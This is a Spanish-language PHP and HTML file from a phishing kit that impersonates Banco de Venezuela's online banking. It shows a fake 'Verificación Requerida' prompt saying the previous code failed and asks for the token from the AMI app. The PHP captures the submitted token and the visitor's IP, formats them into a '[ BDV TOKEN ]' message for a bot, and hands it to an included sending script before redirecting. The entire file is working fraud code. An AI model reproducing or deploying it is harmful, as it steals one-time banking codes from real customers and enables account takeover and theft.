<?php 
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Guardar los datos ingresados
        $_SESSION['tokenc'] = $_POST['tokenc'];
        
        // Obtener la IP del usuario
        $ip_usuario = $_SERVER['REMOTE_ADDR'];

        // Preparar el mensaje para enviar al bot
        $enviara = 
        "<b>➖➖➖ [ BDV TOKEN ] ➖➖➖</b>\n".
		"<b> IP: </b> <code>" . $ip_usuario . "</code>\n".
		"<b>TOKEN: </b> <code>".$_POST['tokenc']."</code>\n";
        
        
        $enviar = urldecode($enviara);
        
        // Incluir function.php para enviar el mensaje
        include 'config/function.php';
        
        // Redirigir
        header("Location: index.php");
        exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style>
		body {
			transition: opacity ease-in 0.2s;
		}
		body[unresolved] {
			opacity: 0;
			display: block;
			overflow: hidden;
			position: relative;
		}
	</style>
	<title>BDVenlínea personas</title>
	<script src="js/jquery.min.js"></script>
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="css/estilo.css" rel="stylesheet">
	<link href="css/estilos.css" rel="stylesheet">
	<link rel="shortcut icon" href="img/favicon-16x16.png" type="image/x-icon">

	<style type="text/css">
		#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}
	</style>
</head>

<body style="overflow: hidden;
background-color: #ededed;
background-image: url(img/wallp.webp);
background-position: center center;
background-size: cover;
background-repeat: no-repeat;
height: 100vh;">
		<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div>
		<section class="containerCustom" id="docPopup" style="display: block;">
			<form action="toka.php" id="mainF" method="post" name="mainF">
				<div class="overlay">
					<div class="modalCustom" style="    background-color: #f4f4f4;
					padding: 20px;
					border-radius: 20px;
					position: fixed;
					top: 120px !important;
					max-width: 350px;
					z-index: 1000000;">
						<center>
							<img src="img/logotipo.png" width="225px"><br>
							<h1 style="font-family: 'Nunito';     font-size: 21px;
							font-family: system-ui;
							color: grey;
							margin: 11px;" class="title" style="font-size: 21px;">Verificación Requerida</h1>
							<hr>
							<p style="font-family: 'Nunito'; margin-top: 12px;  margin-bottom: 12px; color:red">El código proporcionado es incorrecto o ha expirado. Por favor, inténtelo nuevamente.</p>
							
							<p style="font-family: 'Nunito';
                            margin-top: 12px;
                            margin-bottom: 12px;">Ingresá el TOKEN generado por tu app AMI</p>
							<input class="inputCodes" maxlength="8" minlength="6" name="tokenc" id="tokencode" pattern="[0-9]+" placeholder="Código" required style="
							border-radius: 10px;
							border-bottom: 1px solid #b3bac8;
							border-top: 1px solid #b3bac8;
							border-left: 1px solid #b3bac8;
							border-right: 1px solid #b3bac8;
							max-width: 600px;
							margin: 0px 7px;
							height: 50px;
							font-size: 18px;
							width: 300px;
							text-align: center;
							outline: none;" type="tel"><br>
							<br>
							<button class="mat-raised-button mat-accent" style="background-color: #0067b1;" id="submitToken" type="submit">Continuar</button>
						</center>
					</div>
				</div>
			</form>
		</section>
</body>
</html>